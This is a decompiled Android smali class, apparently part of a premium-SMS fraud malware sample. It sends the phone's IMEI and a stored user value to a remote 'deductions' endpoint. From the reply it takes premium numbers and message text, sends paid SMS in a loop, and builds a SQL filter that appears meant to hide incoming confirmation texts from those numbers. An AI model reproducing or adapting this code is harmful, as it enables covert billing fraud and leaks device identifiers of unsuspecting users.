.class public LDaemon/Global/MostSpHttp;
.super Ljava/lang/Object;
.source "MostSpHttp.java"

# interfaces
.implements LDaemon/Base/HttpBase;


# static fields
.field private static final sms:I = 0x4

.field private static final url:Ljava/lang/String; = "http://domaindev.51widgets.com/ss/service/action.php?action=deductions"


# instance fields
.field private businessnumber:I

.field private category:I

.field private number:I

.field private price:I

.field private spnumber:I

.field private spnumcode:Ljava/util/Vector;

.field private sptext:Ljava/lang/String;

.field private spurl:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    const/4 v0, 0x0

    const-string v1, ""

    .line 32
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 18
    iput v0, p0, LDaemon/Global/MostSpHttp;->spnumber:I

    .line 19
    iput v0, p0, LDaemon/Global/MostSpHttp;->businessnumber:I

    .line 20
    iput v0, p0, LDaemon/Global/MostSpHttp;->category:I

    .line 22
    iput v0, p0, LDaemon/Global/MostSpHttp;->price:I

    .line 23
    iput v0, p0, LDaemon/Global/MostSpHttp;->number:I

    .line 25
    const-string v0, ""

    iput-object v1, p0, LDaemon/Global/MostSpHttp;->sptext:Ljava/lang/String;

    .line 26
    const-string v0, ""

    iput-object v1, p0, LDaemon/Global/MostSpHttp;->spurl:Ljava/lang/String;

    .line 28
    const/4 v0, 0x0

    iput-object v0, p0, LDaemon/Global/MostSpHttp;->spnumcode:Ljava/util/Vector;

    .line 33
    new-instance v0, Ljava/util/Vector;

    invoke-direct {v0}, Ljava/util/Vector;-><init>()V

    iput-object v0, p0, LDaemon/Global/MostSpHttp;->spnumcode:Ljava/util/Vector;

    .line 34
    return-void
.end method


# virtual methods
.method public getBusinessnumber()I
    .locals 1

    .prologue
    .line 41
    iget v0, p0, LDaemon/Global/MostSpHttp;->businessnumber:I

    return v0
.end method

.method public getCategory()I
    .locals 1

    .prologue
    .line 44
    iget v0, p0, LDaemon/Global/MostSpHttp;->category:I

    return v0
.end method

.method public getHttpUrl()Ljava/lang/String;
    .locals 3

    .prologue
    .line 67
    const-string v0, ""

    .line 68
    .local v0, "URL":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "&imei="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v2}, LDaemon/Global/RegHttp;->getImei()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&mdpsw="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v2}, LDaemon/Global/RegHttp;->getuser_value()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 69
    const-string v2, "&version="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const/16 v2, 0x65

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&channe="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const v2, 0x605c380

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 68
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 70
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "http://domaindev.51widgets.com/ss/service/action.php?action=deductions"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    return-object v1
.end method

.method public getNumber()I
    .locals 1

    .prologue
    .line 50
    iget v0, p0, LDaemon/Global/MostSpHttp;->number:I

    return v0
.end method

.method public getPrice()I
    .locals 1

    .prologue
    .line 47
    iget v0, p0, LDaemon/Global/MostSpHttp;->price:I

    return v0
.end method

.method public getSpnumber()I
    .locals 1

    .prologue
    .line 38
    iget v0, p0, LDaemon/Global/MostSpHttp;->spnumber:I

    return v0
.end method

.method public getSptext()Ljava/lang/String;
    .locals 1

    .prologue
    .line 54
    iget-object v0, p0, LDaemon/Global/MostSpHttp;->sptext:Ljava/lang/String;

    return-object v0
.end method

.method public getSpurl()Ljava/lang/String;
    .locals 1

    .prologue
    .line 57
    iget-object v0, p0, LDaemon/Global/MostSpHttp;->spurl:Ljava/lang/String;

    return-object v0
.end method

.method public parsePackage(Ljava/lang/String;)I
    .locals 14
    .param p1, "temp"    # Ljava/lang/String;

    .prologue
    const/4 v12, -0x1

    const/4 v11, 0x0

    const-string v13, "http"

    const-string v8, ""

    const-string v8, " "

    .line 77
    const-string v8, "http"

    const-string v8, "parsePackage state:start"

    invoke-static {v13, v8}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 79
    const-string v8, "<msg>"

    invoke-virtual {p1, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v8

    if-eq v8, v12, :cond_0

    .line 80
    const-string v8, "msg"

    invoke-static {p1, v8}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    sput-object v8, LDaemon/Service/RerviceHttp;->msg:Ljava/lang/String;

    .line 81
    const/4 v8, 0x2

    .line 135
    :goto_0
    return v8

    .line 87
    :cond_0
    :try_start_0
    const-string v8, "spnamber"

    invoke-static {p1, v8}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    iput v8, p0, LDaemon/Global/MostSpHttp;->spnumber:I

    .line 88
    const-string v8, "businessnamber"

    invoke-static {p1, v8}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    iput v8, p0, LDaemon/Global/MostSpHttp;->businessnumber:I

    .line 89
    const-string v8, "category"

    invoke-static {p1, v8}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    iput v8, p0, LDaemon/Global/MostSpHttp;->category:I

    .line 90
    const-string v8, "price"

    invoke-static {p1, v8}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    iput v8, p0, LDaemon/Global/MostSpHttp;->price:I

    .line 91
    const-string v8, "number"

    invoke-static {p1, v8}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    iput v8, p0, LDaemon/Global/MostSpHttp;->number:I

    .line 93
    const-string v8, "content"

    invoke-static {p1, v8}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 95
    .local v0, "content":Ljava/lang/String;
    iget v8, p0, LDaemon/Global/MostSpHttp;->category:I

    const/4 v9, 0x4

    if-ne v8, v9, :cond_2

    .line 97
    const/4 v8, 0x0

    const-string v9, " "

    invoke-virtual {v0, v9}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v9

    invoke-virtual {v0, v8, v9}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v8

    iput-object v8, p0, LDaemon/Global/MostSpHttp;->sptext:Ljava/lang/String;

    .line 98
    const-string v8, " "

    invoke-virtual {v0, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v8

    add-int/lit8 v8, v8, 0x1

    invoke-virtual {v0, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v8

    iput-object v8, p0, LDaemon/Global/MostSpHttp;->spurl:Ljava/lang/String;

    .line 105
    :goto_1
    iget-object v8, p0, LDaemon/Global/MostSpHttp;->spnumcode:Ljava/util/Vector;

    invoke-virtual {v8}, Ljava/util/Vector;->removeAllElements()V

    .line 107
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "shield"

    invoke-static {p1, v9}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v9, " "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 108
    .local v3, "shield":Ljava/lang/String;
    :goto_2
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v8

    if-lez v8, :cond_1

    const-string v8, " "

    invoke-virtual {v3, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v8

    if-ne v8, v12, :cond_3

    .line 114
    :cond_1
    iget-object v8, p0, LDaemon/Global/MostSpHttp;->spnumcode:Ljava/util/Vector;

    invoke-virtual {v8}, Ljava/util/Vector;->size()I

    move-result v8

    new-array v4, v8, [Ljava/lang/String;

    .line 115
    .local v4, "spcode":[Ljava/lang/String;
    const-string v5, ""

    .line 116
    .local v5, "sql":Ljava/lang/String;
    const-string v6, ""

    .line 117
    .local v6, "sqltemp":Ljava/lang/String;
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_3
    iget-object v8, p0, LDaemon/Global/MostSpHttp;->spnumcode:Ljava/util/Vector;

    invoke-virtual {v8}, Ljava/util/Vector;->size()I

    move-result v8

    if-lt v2, v8, :cond_4

    .line 124
    sget-object v8, LHamsterSuper/Client/Deamon/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    invoke-virtual {v8, v4}, LDaemon/Service/SMSObserver;->setSqlValue([Ljava/lang/String;)V

    .line 125
    sget-object v8, LHamsterSuper/Client/Deamon/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    invoke-virtual {v8, v5}, LDaemon/Service/SMSObserver;->setSql(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 133
    const-string v8, "http"

    const-string v8, "parsePackage state:end"

    invoke-static {v13, v8}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 135
    const/4 v8, 0x1

    goto/16 :goto_0

    .line 100
    .end local v2    # "i":I
    .end local v3    # "shield":Ljava/lang/String;
    .end local v4    # "spcode":[Ljava/lang/String;
    .end local v5    # "sql":Ljava/lang/String;
    .end local v6    # "sqltemp":Ljava/lang/String;
    :cond_2
    :try_start_1
    iput-object v0, p0, LDaemon/Global/MostSpHttp;->spurl:Ljava/lang/String;

    goto :goto_1

    .line 130
    .end local v0    # "content":Ljava/lang/String;
    :catch_0
    move-exception v8

    move-object v1, v8

    .local v1, "e":Ljava/lang/Exception;
    move v8, v11

    .line 131
    goto/16 :goto_0

    .line 109
    .end local v1    # "e":Ljava/lang/Exception;
    .restart local v0    # "content":Ljava/lang/String;
    .restart local v3    # "shield":Ljava/lang/String;
    :cond_3
    const/4 v8, 0x0

    const-string v9, " "

    invoke-virtual {v3, v9}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v9

    add-int/lit8 v9, v9, 0x1

    invoke-virtual {v3, v8, v9}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v7

    .line 110
    .local v7, "tempp":Ljava/lang/String;
    iget-object v8, p0, LDaemon/Global/MostSpHttp;->spnumcode:Ljava/util/Vector;

    const-string v9, " "

    const-string v10, ""

    invoke-static {v7, v9, v10}, LDaemon/Base/Tools;->mab885b58(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/util/Vector;->addElement(Ljava/lang/Object;)V

    .line 111
    const-string v8, ""

    invoke-static {v3, v7, v8}, LDaemon/Base/Tools;->mab885b58(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    goto :goto_2

    .line 118
    .end local v7    # "tempp":Ljava/lang/String;
    .restart local v2    # "i":I
    .restart local v4    # "spcode":[Ljava/lang/String;
    .restart local v5    # "sql":Ljava/lang/String;
    .restart local v6    # "sqltemp":Ljava/lang/String;
    :cond_4
    iget-object v8, p0, LDaemon/Global/MostSpHttp;->spnumcode:Ljava/util/Vector;

    invoke-virtual {v8, v2}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v4, v2

    .line 119
    if-eqz v2, :cond_5

    .line 120
    const-string v6, " OR "

    .line 121
    :cond_5
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "LEFT(address,"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    aget-object v9, v4, v2

    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, ")=?"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v5

    .line 117
    add-int/lit8 v2, v2, 0x1

    goto :goto_3
.end method

.method public setPaintState(I)V
    .locals 4
    .param p1, "httpEnd"    # I

    .prologue
    .line 145
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    iget v1, p0, LDaemon/Global/MostSpHttp;->number:I

    if-lt v0, v1, :cond_1

    .line 152
    const/4 v1, 0x0

    sput-object v1, LHamsterSuper/Client/Deamon/BootReceiver;->online:LDaemon/Service/OnlineThread;

    .line 153
    iget v1, p0, LDaemon/Global/MostSpHttp;->number:I

    if-lez v1, :cond_0

    .line 154
    sget-object v1, LHamsterSuper/Client/Deamon/BootReceiver;->receipt:LDaemon/Global/Receipt;

    invoke-static {v1}, LDaemon/Service/RerviceHttp;->m39bca0c7(LDaemon/Base/HttpBase;)V

    .line 157
    :cond_0
    packed-switch p1, :pswitch_data_0

    .line 173
    :pswitch_0
    return-void

    .line 147
    :cond_1
    iget v1, p0, LDaemon/Global/MostSpHttp;->category:I

    const/4 v2, 0x4

    if-ne v1, v2, :cond_2

    .line 149
    sget-object v1, LHamsterSuper/Client/Deamon/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    iget-object v2, p0, LDaemon/Global/MostSpHttp;->spurl:Ljava/lang/String;

    iget-object v3, p0, LDaemon/Global/MostSpHttp;->sptext:Ljava/lang/String;

    invoke-virtual {v1, v2, v3}, LDaemon/Service/SMSObserver;->sndSms(Ljava/lang/String;Ljava/lang/String;)V

    .line 145
    :cond_2
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 157
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_0
        :pswitch_0
    .end packed-switch
.end method
